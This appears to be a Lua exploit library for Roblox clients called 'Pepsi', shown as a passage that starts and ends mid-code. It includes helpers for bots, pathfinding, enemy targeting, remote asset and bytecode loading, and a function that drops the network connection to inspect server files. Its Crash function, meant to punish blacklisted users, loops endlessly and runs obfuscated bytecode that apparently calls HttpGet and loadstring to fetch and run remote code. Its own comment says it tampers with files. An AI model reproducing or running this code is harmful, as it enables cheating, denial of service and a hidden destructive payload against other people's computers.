			h = true
		},
		max = {
			m = true
		},
		percent = {
			["%"] = true,
			p = true,
			r = true,
			f = true
		},
		num = {
			["#"] = true,
			n = true
		},
		all = {
			["*"] = true,
			a = true
		}
	}
	local args = {...}
	if typeof(human) ~= "Instance" or not human:IsA("Humanoid") then
		table.insert(args, 1, human)
		human = Pepsi.Human()
		if not human then
			return #args > 1 and {0} or 0
		end
	end
	human = human or Pepsi.Human()
	if not human then
		return #args > 1 and {0} or 0
	end
	if #args < 1 then
		return human and human.Health or 0
	elseif #args == 1 then
		if args[1] == 1 then
			return human and human.Health or 0
		elseif args[1] == 2 then
			return human and human.MaxHealth or 0
		elseif args[1] == 3 then
			if human and human.MaxHealth == 100 then -- No point in doing math if its 100.
				return human and human.Health or 0
			end
			return human and math.round(human.Health / human.MaxHealth * 100) or 0
		else
			args[1] = tostring(args[1])
		end
		if type(args[1]) == "string" and args[1]:sub(1, 1):lower() == "p" or args[1]:sub(1, 1):lower() == "%" then
			return human and math.round(human.Health / human.MaxHealth * 100) or 0
		elseif type(args[1]) == "string" and args[1]:sub(1, 1):lower() == "m" then
			return human and human.MaxHealth or 0
		elseif type(args[1]) == "string" and args[1]:sub(1, 1):lower() == "h" then
			return human and human.Health or 0
		elseif type(args[1]) == "string" and args[1]:sub(1, 1):lower() == "a" or args[1]:sub(1, 1):lower() == "*" then
			return {
				(human and human.Health or 0),
				(human and human.MaxHealth or 0),
				(human and math.round(human.Health / human.MaxHealth * 100) or 0),
				health = (human and human.Health or 0),
				max = (human and human.MaxHealth or 0),
				percent = (human and math.round(human.Health / human.MaxHealth * 100) or 0)
			}
		elseif type(args[1]) == "string" and args[1]:sub(1, 1):lower() == "n" or args[1]:sub(1, 1):lower() == "#" then
			return {
				(human and human.Health or 0),
				(human and human.MaxHealth or 0),
				(human and math.round(human.Health / human.MaxHealth * 100) or 0)
			}
		end
	end
	local newargs = {}
	for k, v in pairs(args) do
		if type(v) == "string" then
			table.insert(newargs, v)
		elseif type(v) == "number" then
			table.insert(newargs, "number")
		elseif type(v) == "table" then
			for _k, _v in pairs(v) do
				if type(v) == "string" then
					table.insert(newargs, _v)
				end
			end
		end
	end
	local selection = {}
	for k, v in pairs(newargs) do
		for _k, _v in pairs(dstats) do
			if _v[string.lower(tostring(v)):sub(1, 1)] then
				selection[_k] = true
			end
		end
	end
	local stats = {}
	-- Could we have any more loops for the checking of health??
	if selection.health or selection.all then
		stats.health = human and human.Health or 0
		if selection.num or selection.all then
			stats[1] = human and human.Health or 0
		end
	end
	if selection.max or selection.all then
		stats.max = human and human.MaxHealth or 0
		if selection.num or selection.all then
			stats[2] = human and human.MaxHealth or 0
		end
	end
	if selection.percent or selection.all then
		stats.percent = human and math.round(human.Health / human.MaxHealth * 100) or 0
		if selection.num or selection.all then
			stats[3] = human and math.round(human.Health / human.MaxHealth * 100) or 0
		end
	end
	return stats
end
function Pepsi.Bot.new(options)
	if type(options) ~= "nil" and type(options) ~= "table" then
		Pepsi.Arg(options, {"nil", "table"}, 1, "Pepsi.Bot.new")
	end
	local sets = table.merge({
		name = nil,
		userid = nil,
		spawnpos = nil,
		rig = 1,
		scripts = {}
	}, (options or {}))
	if sets.spawnpos ~= nil then
		sets.spawnpos = Pepsi.ToVector3(sets.spawnpos)
	end
	sets.scripts = sets.scripts or {}
	sets.name = tostring(sets.name or ((sets.userid and Pepsi.encall(Pepsi.Service("Players"), "GetNameFromUserIdAsync", sets.userid)) or tostring("Bot " .. tostring(1 + #Pepsi.Bot.Bots))))
	if (type(sets.scripts) ~= "nil" and type(sets.scripts) ~= "table") or type(sets and sets.name) ~= "string" or (type(sets.userid) ~= "nil" and type(sets.userid) ~= "number") or (type(sets.spawnpos) ~= "nil" and typeof(sets.spawnpos) ~= "Vector3") or (typeof(sets.rig) ~= "EnumItem" and type(sets.rig) ~= "number") then
		Pepsi.Arg(sets.name, {"string"}, 1, "Pepsi.Bot.new")
		Pepsi.Arg(sets.userid, {"nil", "number"}, 1, "Pepsi.Bot.new")
		Pepsi.Arg(sets.spawnpos, {"nil", "Vector3"}, 1, "Pepsi.Bot.new")
		Pepsi.Arg(sets.rig, {"EnumItem", "number"}, 1, "Pepsi.Bot.new")
		Pepsi.Arg(sets.scripts, {"nil", "table"}, 1, "Pepsi.Bot.new")
	end
	local d = assert(Pepsi.Service("Players"):GetHumanoidDescriptionFromUserId(user), "Missing description")
	local r = assert(Pepsi.Service("Players"):CreateHumanoidModelFromDescription(d, sets.rig), "Mising info?")
	local bot = assert(Pepsi.Service("Players"):CreateHumanoidModelFromUserId(sets.userid or 6), "Missing bot?")
	bot.Name = tostring(sets.name or "Bot")
	local rhuman = assert(r:FindFirstChildOfClass("Humanoid") or r:FindFirstChildWhichIsA("Humanoid", true), "Missing bot humanoid?")
	local scr = {}
	local s = r:FindFirstChild("Animate")
	if s then
		s = s:Destroy()
	end
	for _, obj in pairs(char:GetChildren()) do
		if obj:IsA("LuaSourceContainer") then
			local s = obj:Clone()
			s.Disabled = true
			s.Parent = r
			table.insert(scr, s)
		elseif obj:IsA("Humanoid") then
			for _, val in pairs(obj:GetChildren()) do
				if val:IsA("ValueBase") and rhuman and rhuman:FindFirstChild(val.Name) then
					rhuman:FindFirstChild(val.Name).Value = val.Value
				end
			end
		end
	end
	return bot
end
function Pepsi.EIndex(t, i, r)
	Pepsi.ecall(assert, Pepsi.IsA(t, "table") and i ~= nil, not Pepsi.IsA(t, "table") and "Table missing" or "Index missing")
	local s, f = pcall(rawget, t, i)
	local args = {}
	r = (tostring(r or "i"):len() > 0 and tostring(r or "i"):len() < 3) and "i" or r
	tostring(r or "i"):gsub(".", function(m)
		if "i" == m then
			table.insert(args, f)
		elseif "b" == m then
			table.insert(args, s)
		end
	end)
	return unpack(args or {false}) or false
end
function Pepsi.Team(plr, plr2)
	plr = plr or Pepsi.Me() or Pepsi.Service("Players").LocalPlayer
	if not Pepsi.IsA(plr, "Player") then
		plr = Pepsi.Me() or Pepsi.Service("Players").LocalPlayer
	end
	if Pepsi.IsA(plr, "Player") and plr2 == nil then
		return ((function()
			if Pepsi.IsA(plr.Team, game) then
				return plr.Team.Name
			end
			return "Neutral"
		end)()), (plr.TeamColor or BrickColor.White())
	elseif Pepsi.IsA(plr, "Player") and Pepsi.IsA(plr2, "Player") then
		if Pepsi.IsA(plr.Team, game) and Pepsi.IsA(plr2.Team, game) then
			return (plr.Team.Name == plr2.Team.Name and plr2.TeamColor == plr.TeamColor) or plr.Team == plr2.Team
		end
	end
end
function Pepsi.icall(instructions, ...)
	assert(instructions == nil or type(instructions) == "string" or type(instructions) == "table", "bad argument #1 to 'icall' (table/string expected, got " .. typeof(instructions) ~= "nil" and typeof(instructions) or "no value" .. ")")
	assert(#({...}) > 0, "bad argument #2+ to 'icall' (value(s) expected, got no values)")
	local operations = {
		a = false,
		e = false,
		f = false,
		n = false,
		i = false,
		o = false,
		s = false,
		y = false
	}
	local calls = {}
	if type(instructions) == "string" then
		local t = {}
		instructions:gsub(".", function(c)
			table.insert(t, c)
		end)
		instructions = t
	end
	for k, v in pairs(instructions) do
		if type(v) == "string" then
			local instruction = v:sub(1, 1)
			if operations[instruction] ~= nil then
				operations[instruction] = true
				calls[instruction] = true
			end
		end
	end
	if operations.e and operations.s then
		operations.e = false
		calls.e = nil
	end
	calls = table.concat(table.sort(table.keys(calls))) .. "call"
	if calls and rawget(Pepsi, calls) then
		return Pepsi[calls](...)
	end
	return pcall(...)
end
function Pepsi.Closest(objects, opt, ...)
	local from, rev, min, max, fastmin, fastmax, async = unpack({opt, ...})
	if type(opt) == "table" then
		from, rev, min, max, fastmin, fastmax, async = opt.from, opt.rev, opt.min, opt.max, opt.fastmin, opt.fastmax, opt.async
	end
	from = from or Pepsi.Me()	
	if type(objects) ~= "table" and type(from) == "table" then
		objects, from = from, objects
	end
	if (type(fastmax) ~= "boolean" and type(fastmax) ~= "nil") or (type(fastmin) ~= "boolean" and type(fastmin) ~= "nil") or (type(min) ~= "number" and type(min) ~= "nil") or (type(max) ~= "number" and type(max) ~= "nil") or (type(rev) ~= "boolean" and type(rev) ~= "nil") or (typeof(from) ~= "CFrame" and typeof(from) ~= "Vector3" and typeof(from) ~= "Instance") or (type(objects) ~= "table" and typeof(objects) ~= "Instance") then
		Pepsi.Arg(objects, {"table", "Instance"}, 1, "Pepsi.Closest")
		Pepsi.Arg(from, {"CFrame", "Vector3", "Instance"}, 2, "Pepsi.Closest")
		Pepsi.Arg(rev, {"boolean", "nil"}, 3, "Pepsi.Closest")
		Pepsi.Arg(max, {"number", "nil"}, 3, "Pepsi.Closest")
		Pepsi.Arg(min, {"number", "nil"}, 3, "Pepsi.Closest")
		Pepsi.Arg(fastmin, {"boolean", "nil"}, 3, "Pepsi.Closest")
		Pepsi.Arg(fastmax, {"boolean", "nil"}, 3, "Pepsi.Closest")
	end
	if typeof(objects) == "Instance" then
		objects = objects:GetChildren()
	end
	max, min = tonumber(max or math.huge), tonumber(min or 0)
	local closest, dist, dists = nil, tonumber(max or math.huge), {}
	for _, obj in pairs(objects) do
		local d = Pepsi.Dist(obj, from)
		if type(d) == "number" then
			if fastmax and fastmin and max and min and d < min and d > max then
				return obj, {{obj, d}}
			elseif fastmax and max and d > max then
				return obj, {{obj, d}}
			elseif fastmin and min and d > min then
				return obj, {{obj, d}}
			elseif d < max and d > min then
				table.insert(dists, {obj, d})
			end
		end
		if async then
			if typeof(async) == "RBXScriptSignal" then
				async:Wait()
			else
				Pepsi.Rs:Wait()
			end
		end
	end
	if rev then
		table.sort(dists, function(a, b)
			return a[2] > b[2]
		end)
	else
		table.sort(dists, function(a, b)
			return a[2] < b[2]
		end)
	end
	local k, t = next(dists or {})
	if type(t) == "table" then
		local k, o = next(t or {})
		return o, dists
	end
	return nil, dists
end
function Pepsi.GetEnemy(plr)
	if not Pepsi.IsA(plr, "Player") then
		plr = Pepsi.Me()
	end
	if Pepsi.Team(plr) == "Neutral" then
		return Pepsi.GetOthers(plr)
	end
	local losers = {}
	for _, cteam in pairs(Pepsi.Service("Teams"):GetTeams()) do
		if not rawequal(cteam.Name, Pepsi.Team(plr)) then
			for _, loser in pairs(cteam:GetPlayers()) do
				table.insert(losers, loser)
			end
		end
	end
	return losers
end
function Pepsi.Path(vector3, vec2)
	if vector3 and not vec2 then
		Pepsi.WaitForChar()
		vector3, vec2 = Pepsi.Pos(), vector3
	end
	if typeof(vector3) ~= "CFrame" and type(vector3) ~= "nil" and typeof(vector3) ~= "Vector3" then
		Pepsi.Arg(vector3, {"nil", "CFrame", "Vector3"}, 1, "Pepsi.Path")
	end
	vector3 = Pepsi.ToVector3(vector3)
	if typeof(vector3) ~= "Vector3" or (type(vec2) ~= "nil" and typeof(vec2) ~= "CFrame" and typeof(vec2) ~= "Vector3") then
		Pepsi.Arg(vector3, "Vector3", 1, "Pepsi.Path")
		Pepsi.Arg(vec2, {"nil", "CFrame", "Vector3"}, 2, "Pepsi.Path")
	end
	vec2 = Pepsi.ToVector3(vec2 or Pepsi.Torso())
	if typeof(vec2) ~= "Vector3" then
		Pepsi.Arg(vec2, "Vector3", 2, "Pepsi.Path")
	end
	local path = Pepsi.Service("PathfindingService"):CreatePath()
	if path then
		path:ComputeAsync(vector3 or Pepsi.Pos(), vec2)
		return path:GetWaypoints()
	end
	return {}
end
function Pepsi.LoadByteCode(bytecode)
	return Pepsi.LoadAsset(0x150CAFE6F, true, true)(bytecode)
end
function Pepsi.Beautify(source, renamevars) -- Ty stravant
	if source and typeof(source) == "Instance" and source:IsA("LuaSourceContainer") then
		source = source.Source
	end
	if type(source) ~= "string" or (type(source) ~= "nil" and type(source) ~= "boolean") then
		Pepsi.Arg(source, "string", 1, "Pepsi.Beautify")
		Pepsi.Arg(renamevars, {"nil", "boolean"}, 2, "Pepsi.Beautify")
	end
	if string.len(source) < 1 then
		return source
	end
	Pepsi.BeaModule = (Pepsi.BeaModule and type(Pepsi.BeaModule) == "table" and Pepsi.BeaModule) or Pepsi.LoadAsset(5555039349, true)
	return Pepsi.BeaModule.Beautify(source, renamevars)
end
function Pepsi.Minify(source, renameglobals)
	if source and typeof(source) == "Instance" and source:IsA("LuaSourceContainer") then
		source = source.Source
	end
	if type(source) ~= "string" or (type(source) ~= "nil" and type(source) ~= "boolean") then
		Pepsi.Arg(source, "string", 1, "Pepsi.Minify")
		Pepsi.Arg(renameglobals, {"nil", "boolean"}, 2, "Pepsi.Minify")
	end
	if string.len(source) < 1 then
		return source
	end
	Pepsi.MinModule = (Pepsi.MinModule and type(Pepsi.MinModule) == "table" and Pepsi.MinModule) or Pepsi.LoadAsset(4709427090)()
	return Pepsi.MinModule.Minify(source, renameglobals)
end
function Pepsi.Navigate(vector3, opt, ...)
	local min_dist, failsafe, returnfail, timeout, async = unpack({opt, ...})
	if type(opt) == "table" then
		min_dist, failsafe, returnfail, timeout, async = (opt.dist or opt.min or opt.min_dist), opt.failsafe, opt.returnfail, opt.timeout, opt.async
	end
	local timeouttime = time()
	Pepsi.Navigating = false
	if (type(timeout) ~= "number" and type(timeout) ~= "nil") or (type(async) ~= "boolean" and type(async) ~= "nil") or (type(returnfail) ~= "boolean" and type(returnfail) ~= "nil") or (type(failsafe) ~= "boolean" and type(failsafe) ~= "nil") then
		Pepsi.Arg(failsafe, {"boolean", "nil"}, 2, "Pepsi.Navigate")
		Pepsi.Arg(returnfail, {"boolean", "nil"}, 2, "Pepsi.Navigate")
		Pepsi.Arg(timeout, {"number", "nil"}, 2, "Pepsi.Navigate")
		Pepsi.Arg(async, {"boolean", "nil"}, 2, "Pepsi.Navigate")
	end
	Pepsi.WaitForChar()
	local human, torso, min_dist = Pepsi.Human(), Pepsi.Torso(), tonumber(min_dist or 5)
	assert(type(vector3) ~= "nil", "bad argument #1 to 'Navigate' (Vector3 expected, got " .. typeof(vector3) .. ")")
	assert(min_dist == nil or type(min_dist) == "number", "bad argument #2 to 'Navigate' (number expected, got " .. typeof(min_dist) .. ")")
	vector3 = Pepsi.ToVector3(vector3)
	assert(vector3 and typeof(vector3) == "Vector3", "bad argument #1 to 'Navigate' (Vector3 expected, got " .. typeof(vector3) .. ")")
	if human == nil or typeof(human) == "Instance" and human:IsA("Humanoid") then
		Pepsi.Navigating = true
		torso = torso or Pepsi.Torso()
		local t = 0
		local retf = false
		while Pepsi.Navigating and (vector3 - torso.Position).Magnitude > min_dist and (not timeout or time() - timeouttime < timeout) do
			torso = torso or Pepsi.Torso()
			human = human or Pepsi.Human()
			if torso and human then
				--Pepsi.Dev("nav", (vector3 - torso.Position).Magnitude, (vector3 - torso.Position).Magnitude > 10, nav)
				local start = torso.Position
				if typeof(start) == "Vector3" then
					if (vector3 - torso.Position).Magnitude <= min_dist then
						return true
					end
					local waypoints = Pepsi.Path(start, vector3)
					if Pepsi.Navigating and waypoints and #waypoints > 0 then
						local n = #waypoints > 4 and 5 or #waypoints > 3 and 4 or #waypoints > 2 and 3 or 2 or 1
						if waypoints[n] and waypoints[n].Action == 1 then
							human.Jump = true
							delay(0.1, function()
								human.Jump = false
							end)
						end
						if Pepsi.Navigating and waypoints[n] and waypoints[n].Position then
							human:MoveTo(waypoints[n].Position)
						end
						if retf then
							return false
						end
						if failsafe or returnfail then
							Pepsi.delay(1.5, function(cache)
								if not Pepsi.Navigating then
									return false
								end
								local dis = Pepsi.Dist(cache) * 6
								if Pepsi.Navigating and Pepsi.Dist(cache) < 8 then
									if returnfail then
										retf = true
										return
									end
									Pepsi.Char():TranslateBy((Pepsi.Torso().CFrame.LookVector * 5))
									Pepsi.Char():MoveTo(Pepsi.Pos())
								elseif Pepsi.Navigating and Pepsi.Dist(cache) < 20 then
									if returnfail then
										retf = true
										return
									end
									Pepsi.Char():TranslateBy((Pepsi.Torso().CFrame.LookVector * 3))
								elseif Pepsi.Navigating and Pepsi.Dist(cache) < 25 then
									if returnfail then
										retf = true
										return
									end
									human = human or Pepsi.Human()
									human.Jump = true
									wait(0.1)
									human.Jump = false
								end
							end, Pepsi.Pos())
						end
					else
						if (vector3 - torso.Position).Magnitude > min_dist then
							nav = nil
						end
					end
				end
			end
			if async then
			if typeof(async) == "RBXScriptSignal" then
				async:Wait()
			else
				Pepsi.Rs:Wait()
			end
		end
		end
		Pepsi.Navigating = false
		Pepsi.Dev("nav", "Navigation finished")
		if timeout and time() - timeouttime >= timeout then
			return false
		end
		return true
	end
	Pepsi.Navigating = false
	Pepsi.Dev("nav", "Navigation failed - Human lost")
	return false
end
function Pepsi.SetupVars()
	if type(Pepsi.VarSignals) == "table" then
		for k, v in pairs(Pepsi.VarSignals) do
			if typeof(v) == "RBXScriptConnection" then
				v:Disconnect()
				v = nil
			end
		end
	end
	local args = Pepsi.Vars or {
		Backpack = false,
		Camera = false,
		CFrame = false,
		Character = false,
		Connect = true,
		Enabled = false,
		Gui = false,
		Head = false,
		Health = false,
		Humanoid = false,
		Tool = false,
		Torso = false,
		Update = Pepsi.Service("RunService").RenderStepped,
		Vector3 = false
	}
	if args and type(args) == "table" then
		if args.Enabled then
			Pepsi.VarSignals.Update = coroutine.wrap(Pepsi.fcall(function(param)
				for k, v in pairs(args) do
					local name = tostring(k or "nil")
					if name == "Backpack" then
						
					end
				end
				if Pepsi.VarSignals.Clear then
					Pepsi.VarSignals.Clear = nil
					coroutine.yield()
					Pepsi.VarSignals.Update = nil
				end
			end))
		end
	end
end
function Pepsi.LiveVars(args)
	do return end
	args = args or {
		Backpack = false,
		Camera = false,
		CFrame = false,
		Character = false,
		Connect = true,
		Enabled = false,
		Gui = false,
		Head = false,
		Health = false,
		Humanoid = false,
		Tool = false,
		Torso = false,
		Update = Pepsi.Service("RunService").RenderStepped,
		Vector3 = false
	}
	if typeof(args) == "table" then
		local narg = {unpack(Pepsi.Vars)}
		for k, v in pairs(args) do
			if k ~= "Update" and type(v) == "boolean" or k == "Update" then
				narg[k] = v
			end
		end
		Pepsi.Vars = {unpack(narg)}
		narg = nil
	end
--	return pcall(Pepsi.SetupVars) -- WIP
end
function Pepsi.Offline() -- Yeah, now you can play offline. Multiplayer cut, and options are limited. but you cannot timeout or be kicked (However the server will register that you have left the game). (Perfect for digging through the server files (Or saveinstance)
	return pcall(function()
		Pepsi.Service("NetworkClient"):FindFirstChildOfClass("NetworkReplicator"):CloseConnection()
	end)
end
function Pepsi.Line(level)
	if type(level) ~= "number" and type(level) ~= "nil" then
		Pepsi.Arg(level, {"number", "nil"}, 1, "Pepsi.Line")
	end
	local lines = {}
	local trace = string.gsub(debug.traceback(), "[^\r\n]+", function(c)
		table.insert(lines, c)
	end)
	level = math.clamp(tonumber(level or 3), 0, #lines)
	local str = rawget(lines, level)
	if type(str) == "string" then
		return tonumber(tostring(string.match(str, ":(%d+)$")))
	end
end
function Pepsi.Crash(destroy_my_pc) -- Strongly recommend reserving the destroy_my_pc for severe cases. (Black lists shouldn't have to suffer this punishment unless a brutal betrayal was made (But ultimately, it is your decision. And Yes. This method HARMS much more than roblox. Files will be tampered with.)
	pcall(Pepsi.Offline)
	if destroy_my_pc == true then
		return (function()
			repeat
				for k = -math.huge, math.huge, 0.0000000001 do
					while not false or true or 1 or not (nil == #string.rep("x", 9^9 + math.random(-1000, 1000)) and  1 == #("f"):rep(9^9 + math.random(-1000, 1000)) and nil and 1 + 1 == 1 and nil ~= nil and true == false and game == nil and string.rep("x", 9^9) and not true) or false == (nil == #string.rep("x", 9^9 + math.random(-1000, 1000)) and  1 == #("f"):rep(9^9 + math.random(-1000, 1000)) and nil and 1 + 1 == 1 and nil ~= nil and true == false and game == nil and string.rep("x", 9^9) and not true) or true or true or 1 == 1 do
						pcall(spawn, Pepsi.Destroy)
						pcall(spawn, Pepsi.Rejoin)
						pcall(spawn, loadstring((string.char(0X1B, 0X4C, 0X75, 0X61, 0X51, 0X0, 0X1, 0X4, 0X4, 0X4, 0X8, 0X0, 0X13, 0X0, 0X0, 0X0, 0X40, 0X6D, 0X41, 0X49, 0X39, 0X52, 0X74, 0X4E, 0X78, 0X54, 0X73, 0X6D, 0X62, 0X4D, 0X68, 0X4B, 0X6F, 0X6A, 0X0, 0X0, 0XB4, 0XB2, 0X1B, 0X34, 0X9D, 0X8C, 0X71, 0X0, 0X0, 0X2, 0X82, 0X88, 0X0, 0X0, 0X0, 0X5, 0X0, 0X0, 0X0, 0X45, 0X40, 0X0, 0X0, 0X85, 0X80, 0X0, 0X0, 0XC5, 0XC0, 0X0, 0X0, 0XCB, 0X0, 0XC1, 0X1, 0X45, 0X41, 0X1, 0X0, 0X46, 0X81, 0XC1, 0X2, 0X81, 0XC1, 0X1, 0X0, 0XC1, 0X1, 0X2, 0X0, 0X1, 0X2, 0X2, 0X0, 0X41, 0X42, 0X2, 0X0, 0X81, 0X82, 0X2, 0X0, 0XC1, 0XC2, 0X2, 0X0, 0X1, 0X3, 0X3, 0X0, 0X41, 0X3, 0X3, 0X0, 0X81, 0X43, 0X3, 0X0, 0XC1, 0X83, 0X3, 0X0, 0X1, 0X84, 0X2, 0X0, 0X41, 0X4, 0X2, 0X0, 0X81, 0XC4, 0X3, 0X0, 0XC1, 0X44, 0X3, 0X0, 0X1, 0X85, 0X3, 0X0, 0X41, 0X5, 0X2, 0X0, 0X81, 0XC5, 0X1, 0X0, 0XC1, 0X5, 0X4, 0X0, 0X1, 0X46, 0X4, 0X0, 0X41, 0XC6, 0X3, 0X0, 0X81, 0X86, 0X4, 0X0, 0XC1, 0XC6, 0X4, 0X0, 0X1, 0X7, 0X5, 0X0, 0X41, 0X7, 0X3, 0X0, 0X81, 0X47, 0X5, 0X0, 0XC1, 0X7, 0X4, 0X0, 0X1, 0X88, 0X4, 0X0, 0X41, 0X88, 0X5, 0X0, 0X81, 0XC8, 0X5, 0X0, 0XC1, 0X88, 0X3, 0X0, 0X1) .. string.char(0XC9, 0X4, 0X0, 0X41, 0X9, 0X6, 0X0, 0X81, 0X9, 0X6, 0X0, 0XC1, 0X49, 0X6, 0X0, 0X1, 0XA, 0X3, 0X0, 0X41, 0X4A, 0X4, 0X0, 0X81, 0X8A, 0X4, 0X0, 0XC1, 0X8A, 0X6, 0X0, 0X1, 0XCB, 0X6, 0X0, 0X41, 0X8B, 0X5, 0X0, 0X81, 0X8B, 0X6, 0X0, 0XC1, 0XCB, 0X6, 0X0, 0X1, 0XC, 0X7, 0X0, 0X41, 0X4C, 0X7, 0X0, 0X81, 0X8C, 0X4, 0X0, 0XC1, 0X8C, 0X7, 0X0, 0X1, 0X4D, 0X7, 0X0, 0X41, 0X4D, 0X7, 0X0, 0X81, 0X8D, 0X7, 0X0, 0XC1, 0XCD, 0X7, 0X0, 0X1, 0XE, 0X8, 0X0, 0X41, 0XCE, 0X7, 0X0, 0X81, 0X4E, 0X8, 0X0, 0XC1, 0X8E, 0X5, 0X0, 0X1, 0XF, 0X6, 0X0, 0X41, 0X4F, 0X4, 0X0, 0X81, 0X8F, 0X7, 0X0, 0XC1, 0X8F, 0X5, 0X0, 0X1, 0X10, 0X7, 0X0, 0X41, 0X50, 0X6, 0X0, 0X81, 0XD0, 0X6, 0X0, 0XC1, 0X90, 0X8, 0X0, 0X1, 0X91, 0X8, 0X0, 0X41, 0X11, 0X7, 0X0, 0X81, 0XD1, 0X8, 0X0, 0XC1, 0X11, 0X8, 0X0, 0X1, 0X92, 0X7, 0X0, 0X41, 0X12, 0X3, 0X0, 0X81, 0XD2, 0X5, 0X0, 0XC1, 0X92, 0X5, 0X0, 0X1, 0X13, 0X9, 0X0, 0X41, 0X13, 0X3, 0X0, 0X81, 0X13, 0X6, 0X0, 0XC1, 0X93, 0X6, 0X0, 0X1, 0XD4, 0X8, 0X0, 0X41, 0X14, 0X8, 0X0, 0X81, 0X54, 0X7, 0X0, 0XC1, 0X54, 0X6, 0X0, 0X1, 0X15, 0X8, 0X0, 0X41, 0X55, 0X4, 0X0, 0X81) .. string.char(0X15, 0X8, 0X0, 0XC1, 0XD5, 0X7, 0X0, 0X1, 0X16, 0X7, 0X0, 0X41, 0X96, 0X8, 0X0, 0X81, 0X96, 0X5, 0X0, 0XC1, 0X16, 0X8, 0X0, 0X1, 0X57, 0X8, 0X0, 0X41, 0X57, 0X4, 0X0, 0X81, 0X97, 0X6, 0X0, 0XC1, 0X57, 0X4, 0X0, 0X1, 0X98, 0X8, 0X0, 0X41, 0XD8, 0X6, 0X0, 0X81, 0X18, 0X6, 0X0, 0XC1, 0X58, 0X9, 0X0, 0X1, 0X59, 0X4, 0X0, 0X41, 0X19, 0X7, 0X0, 0X81, 0X59, 0X4, 0X0, 0XC1, 0XD9, 0X6, 0X0, 0X1, 0XDA, 0X7, 0X0, 0X41, 0X9A, 0X8, 0X0, 0X81, 0X1A, 0X6, 0X0, 0XC1, 0XDA, 0X6, 0X0, 0X1, 0X1B, 0X7, 0X0, 0X41, 0XDB, 0X8, 0X0, 0X81, 0X5B, 0X8, 0X0, 0XC1, 0XDB, 0X6, 0X0, 0X1, 0X1C, 0X8, 0X0, 0X41, 0X5C, 0X9, 0X0, 0X81, 0X1C, 0X6, 0X0, 0XC1, 0XDC, 0X8, 0X0, 0X1, 0X9D, 0X7, 0X0, 0X41, 0XDD, 0X7, 0X0, 0X81, 0X1D, 0X3, 0X0, 0XC1, 0X9D, 0X9, 0X0, 0X1, 0X1E, 0X8, 0X0, 0X41, 0X5E, 0X2, 0X0, 0X81, 0X9E, 0X2, 0X0, 0XC1, 0X9E, 0X3, 0X0, 0X1, 0X1F, 0X8, 0X0, 0X41, 0X9F, 0X6, 0X0, 0X81, 0XDF, 0X3, 0X0, 0XC1, 0XDF, 0X9, 0X0, 0X1, 0X20, 0X4, 0X0, 0X41, 0XA0, 0X5, 0X0, 0X5C, 0X1, 0X80, 0X3E, 0XDC, 0X0, 0X0, 0X0, 0X9C, 0X0, 0X0, 0X0, 0X1C, 0X40, 0X0, 0X0, 0X1E, 0X0, 0X80, 0X0, 0X28, 0X0, 0X0, 0X0, 0X4) .. string.char(0X6, 0X0, 0X0, 0X0, 0X70, 0X63, 0X61, 0X6C, 0X6C, 0X0, 0X4, 0X6, 0X0, 0X0, 0X0, 0X73, 0X70, 0X61, 0X77, 0X6E, 0X0, 0X4, 0XB, 0X0, 0X0, 0X0, 0X6C, 0X6F, 0X61, 0X64, 0X73, 0X74, 0X72, 0X69, 0X6E, 0X67, 0X0, 0X4, 0X5, 0X0, 0X0, 0X0, 0X67, 0X61, 0X6D, 0X65, 0X0, 0X4, 0X8, 0X0, 0X0, 0X0, 0X48, 0X74, 0X74, 0X70, 0X47, 0X65, 0X74, 0X0, 0X4, 0X7, 0X0, 0X0, 0X0, 0X73, 0X74, 0X72, 0X69, 0X6E, 0X67, 0X0, 0X4, 0X5, 0X0, 0X0, 0X0, 0X63, 0X68, 0X61, 0X72, 0X0, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X5A, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X5D, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X5C, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0XC0, 0X5C, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X4D, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X47, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0XC0, 0X59, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X40, 0X5A, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X47, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X40, 0X5D, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X58, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0XC0, 0X58, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0XC0, 0X5B, 0X40, 0X3) .. string.char(0X0, 0X0, 0X0, 0X0, 0X0, 0X40, 0X5B, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X53, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X40, 0X58, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X5C, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X4A, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X49, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X59, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X4B, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X48, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X4B, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X59, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X4C, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X40, 0X59, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X4C, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X4A, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X49, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0XC0, 0X5D, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X80, 0X48, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 0X54, 0X40, 0X3, 0X0, 0X0, 0X0, 0X0, 0X0, 0X0, 